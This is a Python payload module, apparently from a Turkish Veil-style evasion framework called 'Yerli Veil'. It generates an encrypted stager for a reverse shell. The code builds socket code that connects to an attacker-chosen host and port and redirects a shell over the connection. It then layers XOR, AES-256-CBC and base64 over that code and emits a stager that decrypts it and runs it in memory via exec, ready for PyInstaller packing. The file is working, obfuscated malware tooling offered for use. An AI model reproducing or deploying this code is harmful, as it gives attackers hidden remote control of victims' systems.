"""
Yerli Veil - Python AES+XOR reverse stager
Katmanlar: Base64( AES-256-CBC( XOR(stage2_source) ) )
Stage2 decrypt edilip memory'de exec edilir (pyinstaller ile onefile exe olur).
"""
import base64
import hashlib
import os

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

class Payload:
    def generate(self, opts):
        lhost = opts.get("LHOST", "127.0.0.1")
        lport = opts.get("LPORT", "4444")
        aes_key = opts.get("KEY") or os.urandom(32).hex()
        xor_key = os.urandom(16)

        # Stage 2: basit reverse shell source
        stage2_src = f'''
import socket, subprocess, os
s = socket.socket(); s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"]) if os.name != "nt" else subprocess.call(["cmd"])
'''
        xored = bytes(b ^ xor_key[i % len(xor_key)]
                      for i, b in enumerate(stage2_src.encode()))
        cipher = AES.new(bytes.fromhex(aes_key), AES.MODE_CBC)
        blob = base64.b64encode(cipher.iv + xor_key + cipher.encrypt(pad(xored, AES.block_size))).decode()

        stager = f'''#!/usr/bin/env python3
# Yerli Veil stager - {lhost}:{lport}
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
KEY = bytes.fromhex("{aes_key}")
BLOB = "{blob}"
raw = base64.b64decode(BLOB)
iv, xk, ct = raw[:16], raw[16:32], raw[32:]
data = unpad(AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct), AES.block_size)
data = bytes(b ^ xk[i % len(xk)] for i, b in enumerate(data))
exec(data.decode())
'''
        return stager
